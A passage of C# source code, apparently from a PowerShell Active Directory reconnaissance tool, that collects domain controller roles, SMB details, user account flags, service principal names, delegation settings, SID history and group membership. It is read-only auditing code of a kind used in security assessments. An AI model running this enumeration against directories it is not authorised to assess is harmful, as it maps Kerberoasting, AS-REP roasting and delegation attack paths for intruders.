                    bool? Schema = false;
                    bool? RID = false;
                    bool? PDC = false;
                    string Domain = null;
                    string Site = null;
                    string OperatingSystem = null;
                    PSObject DCSMBObj = new PSObject();

                    try
                    {
                        Domain = AdDC.Domain.ToString();
                        foreach (var OperationMasterRole in (System.DirectoryServices.ActiveDirectory.ActiveDirectoryRoleCollection) AdDC.Roles)
                        {
                            switch (OperationMasterRole.ToString())
                            {
                                case "InfrastructureRole":
                                Infra = true;
                                break;
                                case "NamingRole":
                                Naming = true;
                                break;
                                case "SchemaRole":
                                Schema = true;
                                break;
                                case "RidRole":
                                RID = true;
                                break;
                                case "PdcRole":
                                PDC = true;
                                break;
                            }
                        }
                        Site = AdDC.SiteName;
                        OperatingSystem = AdDC.OSVersion.ToString();
                    }
                    catch (System.DirectoryServices.ActiveDirectory.ActiveDirectoryServerDownException)// e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                        Infra = null;
                        Naming = null;
                        Schema = null;
                        RID = null;
                        PDC = null;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", Domain));
                    DCObj.Members.Add(new PSNoteProperty("Site", Site));
                    DCObj.Members.Add(new PSNoteProperty("Name", Convert.ToString(AdDC.Name).Split('.')[0]));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.IPAddress));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Name));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.IPAddress != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.IPAddress);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSchema = (SearchResult) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Properties["objectclass"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Properties["name"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Properties["whencreated"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Properties["whenchanged"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Properties["distinguishedname"][0]));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    string SIDHistory = "";
                    bool? HasSPN = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties["msds-supportedencryptiontypes"].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties["msds-supportedencryptiontypes"][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals("ab721a53-1e2f-11d0-9819-00aa0040529b"))
                            {
                                if (Rule.AccessControlType.ToString() == "Deny")
                                {
                                    string ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == "Everyone")
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == "NT AUTHORITY\\SELF")
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties["pwdLastSet"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) == "0")
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdlastset"][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if (AdUser.Properties["accountExpires"].Count != 0)
                    {
                        if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 9223372036854775807)
                        {
                            if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 0)
                            {
                                try
                                {
                                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                    AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties["accountExpires"][0]));
                                    AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                                }
                                catch //(Exception e)
                                {
                                    //    Console.WriteLine("Exception caught: {0}", e);
                                }
                            }
                        }
                    }
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        if ((bool) TrustedforDelegation)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                        {
                            DelegationType = "Constrained";
                            for (int i = 0; i < AdUser.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                            {
                                var delegateto = AdUser.Properties["msDS-AllowedToDelegateTo"][i];
                                DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                        if ((bool) TrustedtoAuthforDelegation)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }
                    if (AdUser.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdUser.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdUser.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        HasSPN = false;
                    }
                    else if (AdUser.Properties["serviceprincipalname"].Count > 0)
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", (AdUser.Properties["userworkstations"].Count != 0 ? AdUser.Properties["userworkstations"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", (AdUser.Properties["admincount"].Count != 0 ? AdUser.Properties["admincount"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", (AdUser.Properties["primarygroupid"].Count != 0 ? AdUser.Properties["primarygroupid"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties["objectSID"][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Title", (AdUser.Properties["Title"].Count != 0 ? CleanString(AdUser.Properties["Title"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Department", (AdUser.Properties["Department"].Count != 0 ? CleanString(AdUser.Properties["Department"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Company", (AdUser.Properties["Company"].Count != 0 ? CleanString(AdUser.Properties["Company"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Manager", (AdUser.Properties["Manager"].Count != 0 ? CleanString(AdUser.Properties["Manager"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Info", (AdUser.Properties["info"].Count != 0 ? CleanString(AdUser.Properties["info"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", (AdUser.Properties["mobile"].Count != 0 ? CleanString(AdUser.Properties["mobile"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Email", (AdUser.Properties["mail"].Count != 0 ? CleanString(AdUser.Properties["mail"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", (AdUser.Properties["homedirectory"].Count != 0 ? AdUser.Properties["homedirectory"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", (AdUser.Properties["profilepath"].Count != 0 ? AdUser.Properties["profilepath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", (AdUser.Properties["scriptpath"].Count != 0 ? AdUser.Properties["scriptpath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdUser.Properties["useraccountcontrol"].Count != 0 ? AdUser.Properties["useraccountcontrol"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("First Name", (AdUser.Properties["givenName"].Count != 0 ? CleanString(AdUser.Properties["givenName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", (AdUser.Properties["middleName"].Count != 0 ? CleanString(AdUser.Properties["middleName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", (AdUser.Properties["sn"].Count != 0 ? CleanString(AdUser.Properties["sn"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Country", (AdUser.Properties["c"].Count != 0 ? CleanString(AdUser.Properties["c"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", (AdUser.Properties["whencreated"].Count != 0 ? AdUser.Properties["whencreated"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", (AdUser.Properties["whenchanged"].Count != 0 ? AdUser.Properties["whenchanged"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", (AdUser.Properties["distinguishedname"].Count != 0 ? CleanString(AdUser.Properties["distinguishedname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", (AdUser.Properties["canonicalname"].Count != 0 ? CleanString(AdUser.Properties["canonicalname"][0]) : "")));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties["pwdlastset"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) != "0")
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdLastSet"][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    string Description = (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "");
                    string PrimaryGroupID = (AdUser.Properties["primarygroupid"].Count != 0 ? Convert.ToString(AdUser.Properties["primarygroupid"][0]) : "");
                    if (AdUser.Properties["memberof"].Count != 0)
                    {
                        foreach (string Member in AdUser.Properties["memberof"])
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    foreach (string SPN in AdUser.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string ManagedByValue = AdGroup.Properties["managedby"].Count != 0 ? Convert.ToString(AdGroup.Properties["managedby"][0]) : "";
                    string ManagedBy = "";
                    string GroupCategory = null;
                    string GroupScope = null;
                    string SIDHistory = "";

                    if (AdGroup.Properties["managedBy"].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }

                    if (AdGroup.Properties["grouptype"].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties["grouptype"][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? "Security" : "Distribution";

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = "Universal";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = "Global";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = "DomainLocal";
                        }
                    }
                    if (AdGroup.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdGroup.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdGroup.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Properties["samaccountname"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", (AdGroup.Properties["admincount"].Count != 0 ? AdGroup.Properties["admincount"][0] : "")));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", (AdGroup.Properties["Description"].Count != 0 ? CleanString(AdGroup.Properties["Description"][0]) : "")));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Properties["whencreated"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Properties["whenchanged"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Properties["canonicalname"][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    System.DirectoryServices.ResultPropertyValueCollection ReplValueMetaData = (System.DirectoryServices.ResultPropertyValueCollection) AdGroup.Properties["msDS-ReplValueMetaData"];

                    if (ReplValueMetaData.Count != 0)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Properties["samaccountname"][0]));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))),(Convert.ToString(AdGroup.Properties["samaccountname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties["samaccounttype"].Count != 0 ? Convert.ToString(AdGroup.Properties["samaccounttype"][0]) : "";
                    string ObjectClass = Convert.ToString(AdGroup.Properties["objectclass"][AdGroup.Properties["objectclass"].Count-1]);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberName = null;
                        MemberUserName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
